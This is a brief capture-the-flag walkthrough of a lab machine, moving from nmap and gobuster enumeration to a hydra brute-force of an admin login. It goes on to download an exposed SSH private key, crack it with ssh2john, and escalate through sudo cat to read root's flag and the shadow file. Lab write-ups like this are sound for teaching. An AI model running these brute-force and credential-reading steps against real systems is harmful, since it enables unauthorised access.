sudo nmap -sC -sV 10.10.249.93
![Image](./attachments/Pasted_image 20231219172106.png)

gobuster dir -u 10.10.136.132 -w /usr/share/wordlist/
![Image](./attachments/Pasted_image 20231220105112.png)

Looked at the source code on the normal page. Then at the admin page and found this:
![Image](./attachments/Pasted_image 20231220105137.png)

So we know that the login name is 'admin'.

Let's setup a hydra bruteforce attack.

hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.136.132 http-post-form "/admin/:user=admin&pass=^PASS^:password invalid" 
![Image](./attachments/Pasted_image 20231220110248.png)

Found the password: xavier

We can no login and can see our first flag and the RSA private key to login to the SSH server for our next steps to get root on the box.
![Image](./attachments/Pasted_image 20231220110408.png)

We downloaded the key from the server on our local machine
wget 10.10.136.132/admin/panel/id_rsa 
![Image](./attachments/Pasted_image 20231220111710.png)

We then used ssh2john to create a hash from it:
ssh2john id_rsa > hash.txt

We now got the password for the rsa key.

We first need to update the key permissions with:
chmod 600 id_rsa

Then tried to login with the rsa key and the found password for the admin user, but that didn't work. But we know that there is the user 'john', so I tried it for that user and we are able to login and received the user.txt flag!
![Image](./attachments/Pasted_image 20231220112515.png)

Now it's time to for some PrivEsc!
Let's first run sudo -l
![Image](./attachments/Pasted_image 20231220112919.png)

We can run the cat command as sudo, so we can use that to give it our root flag in the root folder with
sudo cat /root/root.txt
![Image](./attachments/Pasted_image 20231220113016.png)
We got the root flag and finished the box.

If the root flag would not have been there, we could also see the content of the passwd and shadow file with the sudo cat command. 
We could have retrieved the root hash and crack it with john and get the password for the sudo user:
![Image](./attachments/Pasted_image 20231220113653.png)

Then on the machine we can move to the root folder and see the root.txt flag:
![Image](./attachments/Pasted_image 20231220113758.png)
